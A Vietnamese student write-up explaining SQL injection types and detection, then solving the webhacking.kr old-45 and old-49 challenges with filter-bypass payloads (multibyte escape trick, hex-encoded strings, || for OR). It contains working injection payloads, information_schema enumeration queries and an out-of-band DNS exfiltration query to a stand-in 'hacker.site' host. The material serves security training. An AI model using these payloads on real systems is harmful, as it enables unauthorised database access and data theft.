
`Task 2:
Tìm hiểu về SQLi (SQLi là gì, hoạt động như thế nào, các loại tấn công phổ biến, cách khai thác, cách ngăn chặn) 
=>Thực hành: Write up chi tiết các bài sau của webhacking.kr: old-45, old-49 (nếu xong sớm có thể làm thêm 27,35,39,51,61 không bắt buộc); root-me: SQL injection blind`

# Tìm hiểu về SQLi 
## 1. SQLi 
Là tấn công mà attacker can thiệp vào cơ sở dữ liệu thông qua các câu truy vấn để truy xuất, sửa đổi, xóa dữ liệu ở database hoặc gây ra ảnh hưởng khác tới nội dung hay thao tác người dùng...
## 2. SQLi hoạt động: 
- Đầu tiên attacker tìm kiếm các điểm yếu trên web như input, parameter...
- Sau đó attacker sẽ thử các câu lệnh SQL cùng với các ký tự khác để xác định cách truy cập vào database
- Cuối cùng là dùng các câu lệnh SQL để tấn công
## 3. Các loại tấn công phổ biến:
- In-Band SQLi: Các phản hồi nhận được kết quả truy vấn SQL. Được chia thành 2 loại:
  * Union-based SQLi: Sử dụng câu lệnh UNION trong các truy vấn SQL để truy cập vào db.
  * Error-based SQLi: Dựa vào lỗi trong câu lệnh SQL để xác định cấu trúc db từ đó tìm cách truy cập vào db.
- Blind SQLi: Các phản hồi không chứa kết quả truy vấn SQL. Được chia thành 2 loại:
  * Boolean: Câu truy vấn trả về chỉ cho biết đúng hoặc sai từ đó attacker điều chỉnh câu truy vấn để khai thác.
  * Time-based: Attacker sẽ sử dụng câu truy vấn làm db trả về kết trong 1 thời gian xác định tùy thuộc tính đúng sai từ đó điều chỉnh câu truy vấn để khai thác.
- Out-of-Band SQLi: Tấn công sử dụng một cấu trúc truy vấn SQL để yêu cầu sever trả về kết quả thông qua các kênh liên quan đến mạng.
## 4. Cách khai thác
### 4.1 Phát hiện
 - Gửi dấu nháy đơn `'` , nháy kép `"`, chấm phẩy `;`, ký tự comment như `--`, `#`,... và chờ kết quả phản hồi của web.
 - Gửi các điều kiện boolean như OR 1=1, OR 1=2 ... và xem phản hồi.
 - Gửi payload thử thời gian trả về như SLEEP(5), pg_sleep(10), DELAY '0:0:10' ...
 
 Từ đó xác định được lỗi SQLi

### 4.2 Xác định thông tin database
 - Xác định bằng cách sử dụng truy vấn như SELECT @@version (MySQL), SELECT * FROM v$version (Oracle)...
 - Recon bằng extension, tool, ... 
 - Dựa vào lỗi SQL server trả về.
  
### 4.3 Khai thác
### In-Band SQLi

#### Error-based:

Chèn một truy vấn độc hại với mục tiêu nhận được thông báo lỗi cung cấp thông tin nhạy cảm về db.

Phá bỏ tính logic của ứng dụng:

Ví dụ: khi đăng nhập với username abcdef và passwd 12345678 thì ứng dụng kiểm tra qua câu truy vấn : 

`SELECT * FROM users WHERE username = 'abcdef' AND password = '12345678'`

Khi đó attacker có thể đăng nhập vào admin mà không cần passwd bằng sử dụng comment -- trong SQL với payload: `admin'--` khi đó câu truy vấn sẽ là :

```
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
```

Hoặc có thể dùng điều kiện boolean với payload : `admin' OR 1=1 --` 

Ngoài ra từ đó có thể khai thác theo hướng UNION

#### Union-based SQLi

Trả về kết quả của các câu lệnh SELECT từ bảng khác với điều kiện trả về cùng số cột và kiểu dữ liệu của cột.

- Xác định số cột cần để tấn công: 
Sử dụng ORDER BY ví dụ `' ORDER BY x--` với x là số cột cần thử và từ phản hồi tìm được số cột

Sử dụng `UNION SELECT` :

```
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

Hoặc sử dụng `ORDER BY` hoặc `GROUP BY`: 

```
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
```

- Sau khi tìm ra số cột thì kiểm tra kiểu dữ liệu trong cột

Giả sử ở đây là 4 cột thì 

Sử dụng `' UNION SELECT 'a',NULL,NULL,NULL--`. Nếu không có lỗi trả về thì xác đinh cột đầu tiên có kiểu dữ liệu là String từ đó tìm kiếm cột khác

- Truy xuất tên db, tên bảng, tên cột:
 
 ```
 #Database names
-1' UNION SELECT 1,2,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata

#Tables of a database
-1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=[database]

#Column names
-1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=[table name]
```
 
 

### Blind SQLi:

Trường hợp này không thể nhìn thấy kết quả truy vấn lỗi nhưng có thể phân biệt được phản hồi đúng hay sai dựa vào nội dung trả về trên trang. Khi đó có thể truy xuất tường ký tự của dữ liệu trong db:

```
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

#### Error Blind SQLi: 
 
 Đây là trường hợp tương tự như trước nhưng thay vì phân biệt giữa phản hồi đúng/sai từ truy vấn thì có thể phân biệt giữa lỗi trong truy vấn SQL hay không (có thể do lỗi HTTP server). Do đó, trong trường hợp này có thể buộc một SQLerror mỗi khi bạn đoán đúng ký tự:
 
 ```
 AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- - 
 ```
 
#### Time-based SQLi: 
 
 Đây là trường hợp không phân biệt được truy vấn dựa vào ngữ cảnh của trang web. Tuy nhiên có thể biết được kết quả truy vấn đúng hay sai bằng cách xác định thời gian trả về từ database: 
 ```
 1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
 ```
 
 ### Out-of-Band SQLi
 Nếu không có phương pháp khai thác nào khác hoạt động thì có thể thử làm cho database lọc ra thông tin sang một máy chủ bên ngoài mà kiểm soát. Ví dụ: thông qua các truy vấn DNS:
 
 ```
 select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 ```
 
 

 
 
 
 # Thực hành:
 ## webhacking.kr

**old-45**

`Description`: 1 form đăng nhập và source code.

Bắt đầu vào chall nhận thấy có một form có 2 input có name là `id` và `pw` sẽ được truyền bằng GET method khi submit.

<img src="https://user-images.githubusercontent.com/92881216/218797551-49e795f1-ed79-41d7-8b90-6e887d50b822.png" width=300px />

Xem source code em thấy các giá trị tham số `id` và `pw` sẽ được lấy từ GET method và được xử lý qua các hàm `addslashes()`, `mb_convert_encoding()`, `preg_match()`. Sau cùng sẽ đưa chúng vào câu truy vấn tới db. Nếu câu truy vấn trả về kết quả và kết quả đó có giá trị của key `id` bằng với `admin` thì chall sẽ được giải (`if($result['id'] == "admin") solve(45);`)

```
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 45</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get>
id : <input name=id value=guest><br>
pw : <input name=pw value=guest><br>
<input type=submit>
</form>
<hr><a href=./?view_source=1>view-source</a><hr>
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']);
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['id'])) exit();
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['pw'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall45 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      echo "hi {$result['id']}";
      if($result['id'] == "admin") solve(45);
    }
    else echo("Wrong");
  }
?>
</body>
</html>
```

- Với hàm `addslashes()`: Đây là hàm sẽ thêm ký tự gạch chéo ngược `\` vào trước các ký tự `'`, `"`, `\` và NULL. Như vậy là đã ngăn chặn được 1 phần tránh bị inject
- Với hàm `mb_convert_encoding()` ở trong bài này sẽ chuyển đổi `$_GET['id']` từ bản mã euc-kr sang bảng mã utf-8.

euc-kr là 1 bảng mã dùng để mã hóa ký tự Hàn Quốc và 1 ký tự được mã hóa bằng 1 cặp hex.

Nhận thấy `\` encode là `%5c`. Khi inject các ký tự đặc biệt như `'`, `"`... `%5c` sẽ đưa vào phía trước các ký tự đó. Vì vậy để bypass ta sẽ thêm ký tự phía trước sao cho khi nó encode kết hợp với `%5c` sẽ được 1 ký tự mới trong mã `euc-kr`. Ở đây, ký tự thỏa mãn để tạo thành sẽ có giá trị hex từ `a1` đến `fe`.

Em chọn là `%a9` khi nhập thẳng vào URL : `%a9%27` sẽ trở thành `%a9%5c%27` (`%27` ở đây là `'`) vì vậy đã inject được `'` thành công.

Câu truy vấn trở thành: `select id from chall45 where id='%a9\' (inject) ' and pw=md5('a')`.

Tiếp theo tìm câu truy vấn để khai thác: 

Hàm `preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['id'])` nếu thấy `$_GET['id']` có chứa `admin`, `select`, `limit`, `pw`, `=`, `>`, `<` thì sẽ thực hiện `exit()` => false

Để câu truy vấn trả về `id` và có giá trị là `admin` em nghĩ đến đoạn inject tiếp theo là: `or id=admin -- -` hoặc `or 1=1 limit 1` nhưng bị false bởi hàm `preg_match()` khi không cho phép dấu `=` hay `limit` hay`admin`.

Vì vậy em thay dấu `=` thành `like` mà mã hóa `admin` dưới dạng hex đc `0x61646d696e`vì trong SQL thì string có thể biểu diễn được dạng hex.

> payload: `%a9%27or id like 0x61646d696e --`

<img src="https://user-images.githubusercontent.com/92881216/218797056-d5f72dad-6dad-4936-b64c-39dbf5139a8c.png" width=800px/>


**old-49**

`Description`: 1 input và source code

```
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 49</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get>
level : <input name=lv value=1><input type=submit>
</form>
<?php
  if($_GET['lv']){
    $db = dbconnect();
    if(preg_match("/select|or|and|\(|\)|limit|,|\/|order|cash| |\t|\'|\"/i",$_GET['lv'])) exit("no hack");
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall49 where lv={$_GET['lv']}"));
    echo $result[0] ;
    if($result[0]=="admin") solve(49);
  }
?>
<hr><a href=./?view_source=1>view-source</a>
</body>
</html>
```
Để giải bài này thì kết quả câu truy vấn trả về với `id` có giá trị là `admin`.

Nhìn qua source code thì ta thấy hàm `preg_match()` đã chặn các từ và ký tự được gửi lên như: `select`, `or`, `(`, `)`, `'` ...
Khi submit với giá trị là 1 thì có kết quả trả về và xem câu truy vấn ta sẽ biết được `lv` có kiểu dữ liệu là int. 

<img src="https://user-images.githubusercontent.com/92881216/219328274-1f347f68-f793-4605-81e3-cddc4d313f3c.png" width=300px />

Vì vậy bài này đơn giản chỉ cần inject vào 1 điều kiện trong biểu thức `WHERE` để trả về `id` có giá trị là `admin`

Toán tử `OR` bị filter nhưng ở đây trong biểu thức `WHERE` có thể dùng `||` thay thế được.
Với `admin` thì mã hóa sang hex được `0x61646d696e` vì trong SQL thì string có thể biểu diễn dưới dạng hex.
Còn ` ` (spaces) thì có thể biểu diễn bởi %0a, %0b, %0c, %0d, %09, %a0 ... ( Ở bài này không cần spaces cũng được)
Và cuối cùng thì để `lv` bằng với một giá trị nào đó mà nó không trả về để đảm bảo kết quả trả về chỉ có 1 giá trị đó là `admin` là do điều kiện phía sau 
 > payload : `0||id=0x61646d696e--`
 
 Câu truy vấn lúc đó sẽ là: `select id from chall49 where lv=0||id=0x61646d696e--`
 
 <img src="https://user-images.githubusercontent.com/92881216/219342998-03d868ec-dc2f-42f5-84f7-49cc57b7f4b4.png" width=300px />


 






